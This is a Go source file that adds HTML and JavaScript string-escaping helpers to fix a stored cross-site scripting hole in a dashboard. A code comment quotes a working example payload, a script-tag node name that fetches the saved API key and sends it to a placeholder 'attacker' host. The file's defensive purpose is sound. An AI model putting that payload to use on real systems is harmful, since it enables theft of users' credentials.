package api

import (
	"html/template"
	"strings"
)

// hesc HTML-escapes an arbitrary user/operator-controlled string so it can be
// safely interpolated into the hand-built HTML fragments served by the
// HTMX-driven dashboard.
//
// The previous code did `fmt.Sprintf("...%s...", node.Name)` straight into
// `c.Data(http.StatusOK, "text/html", ...)`, so a node registered with the
// name `<script>fetch('/api/v1/settings/thothos').then(r=>r.json()).then(j=>fetch('http://attacker/?'+btoa(JSON.stringify(j))))</script>`
// would exfiltrate the saved API key to anyone viewing /nodes. Routing every
// interpolation through hesc closes that hole without forcing a full
// templating rewrite.
func hesc(s string) string {
	return template.HTMLEscapeString(s)
}

// jsStringEscape escapes characters that would let a value break out of a
// single-quoted JavaScript string literal embedded in an inline `onclick`
// handler. Use this in addition to (or instead of) hesc when interpolating
// into JS — HTML escaping alone leaves single-quote `&#39;` ambiguous to JS
// parsers in some browsers.
func jsStringEscape(s string) string {
	r := strings.NewReplacer(
		`\`, `\\`,
		`'`, `\'`,
		`"`, `\"`,
		"\n", `\n`,
		"\r", `\r`,
		"<", `\u003c`,
		">", `\u003e`,
		"&", `\u0026`,
	)
	return r.Replace(s)
}
